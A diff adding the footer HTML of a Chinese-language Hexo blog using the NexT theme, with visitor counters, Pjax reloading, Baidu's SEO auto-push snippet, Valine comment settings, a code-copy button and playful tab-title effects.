+<a target="_blank" rel="noopener" href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referra"><img src="https://z4a.net/images/2022/05/31/image649ac1128183cf97.png"align="absmiddle" width="59px" height="30px" /></a>
+
+
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='255,255,225' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+  <script data-pjax>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+
+  
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : true,
+      appId      : 'kkHz96fwDwdnhN10VTUS0KUx-gzGzoHsz',
+      appKey     : '3th47KWUKTQ2oX3tNXqz6WQW',
+      placeholder: "来留下你的痕迹吧",
+      avatar     : 'retro',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : true,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+    </div>
+
+
+
+
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('复制成功')
+          else $(this).text('复制失败')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('复制')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+
+
+
+
+
+
+</body>
+</html>
+
+
+
+<script type="text/javascript" src="/js/love.js"></script>
+
+
+
+
+<script type="text/javascript">
+    var OriginTitile=document.title,st;
+	document.addEventListener("visibilitychange",function(){
+        document.hidden?(document.title="ヽ(●-`Д´-)ノ网页崩溃了",clearTimeout(st)):(document.title="(Ő∀Ő3)ノ骗你的，别走了！",st=setTimeout(function(){document.title=OriginTitile},3e3))
+    })
+</script>
+
+
